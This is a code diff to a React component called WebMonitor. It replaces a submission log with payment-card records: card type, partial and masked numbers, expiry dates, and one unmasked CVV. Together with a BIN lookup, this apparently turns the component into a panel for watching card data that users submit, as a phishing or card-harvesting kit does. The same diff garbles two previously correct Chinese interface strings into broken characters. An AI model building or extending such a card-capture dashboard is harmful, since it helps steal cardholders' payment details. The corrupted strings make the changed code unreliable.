@@ -89,9 +89,9 @@ const submissionData: UserSubmission[] = [
     },
     submitCount: 3,
     submitHistory: [
-      { timestamp: "2024-01-20 11:28:15", status: "提交", result: "成功" },
-      { timestamp: "2024-01-20 11:25:32", status: "提交", result: "失败" },
-      { timestamp: "2024-01-20 11:22:18", status: "提交", result: "成功" }
+      { timestamp: "11:28", cardType: "debit", partialCard1: "4321", partialCard2: "567", fullCard: "4321 **** **** 5678", expiryDate: "09/26", cvv: "123" },
+      { timestamp: "11:25", cardType: "credit", partialCard1: "5555", partialCard2: "444", fullCard: "5555 **** **** 4444", expiryDate: "08/25", cvv: "***" },
+      { timestamp: "11:22", cardType: "debit", partialCard1: "6226", partialCard2: "789", fullCard: "6226 **** **** 7890", expiryDate: "03/27", cvv: "***" }
     ]
   },
   {
@@ -238,7 +238,7 @@ export function WebMonitor() {
     try {
       await navigator.clipboard.writeText(text);
     } catch (err) {
-      console.error('复制失败:', err);
+      console.error('复制失��:', err);
     }
   };
 
@@ -395,7 +395,7 @@ export function WebMonitor() {
                           {submission.binLookup.cardType}
                         </Badge>
                       ) : (
-                        <span className="text-xs">识别中...</span>
+                        <span className="text-xs">��别中...</span>
                       )}
                     </div>
 
